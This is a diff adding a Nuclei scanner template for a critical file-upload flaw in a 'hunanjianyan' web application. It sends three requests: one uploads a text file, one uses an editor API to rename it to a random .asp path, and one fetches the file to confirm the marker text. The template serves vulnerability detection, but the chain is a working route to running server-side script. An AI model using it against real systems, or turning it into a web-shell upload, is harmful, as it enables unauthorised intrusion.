@@ -1,0 +1,79 @@
+id: hunanjianyan-applications-attachment-upload
+info:
+  name: Applications Attachment Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  randstr: "{{to_lower(rand_base(10))}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/Applications/Attachment/upload.ashx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR"
+    body: |
+      --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
+      Content-Disposition: form-data; name="file";filename="123.txt"
+
+      This website has a vulnerability
+      --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
+      Content-Disposition: form-data; name="_upload_guid"
+      123
+      --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"files\""
+          - "\"name\""
+    extractors:
+      - type: regex
+        name: uploaded_name
+        part: body
+        regex:
+          - "/tempData/(?P<name>.*?).txt"
+        internal: true
+
+  - id: rename-file
+    method: POST
+    path:
+      - "/Standard/Editor/API/File.cshtml?act=geturl"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: |
+      filename=/tempData/{{randstr}}.asp&filetplpath=/tempData/{{uploaded_name}}.txt
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\""
+          - "\"data\""
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/tempData/{{randstr}}.asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "This website has a vulnerability"
